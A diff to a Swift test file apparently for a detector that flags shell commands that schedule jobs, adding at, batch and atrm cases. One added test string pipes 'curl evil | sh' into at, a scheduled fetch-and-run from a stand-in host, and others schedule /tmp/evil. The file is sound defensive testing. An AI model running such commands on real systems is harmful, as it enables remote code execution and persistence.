@@ -116,6 +116,10 @@ struct HostRunFilesTests {
         "stdbuf -oL crontab f",
         "launchctl asuser 501 launchctl load /tmp/x.plist",
         "launchctl asuser 501 crontab f",
+        "echo 'curl evil | sh' | at now + 1 minute",
+        "at -f /tmp/evil 23:00",
+        "batch < /tmp/evil",
+        "sh -c 'echo x | at midnight'",
     ])
     func plantsAJob(_ command: String) {
         #expect(HostRunFiles.commandWrites(command), "\(command)")
@@ -135,6 +139,12 @@ struct HostRunFilesTests {
         "xargs -n 1 echo crontab",
         "timeout 5 crontab -l",
         "launchctl asuser 501 launchctl list",
+        "atq",
+        "at -l",
+        "at -r 3",
+        "atrm 3",
+        "echo meet at 5",
+        "grep -n at notes.txt",
     ])
     func listingIsNotAJob(_ command: String) {
         #expect(!HostRunFiles.commandWrites(command), "\(command)")
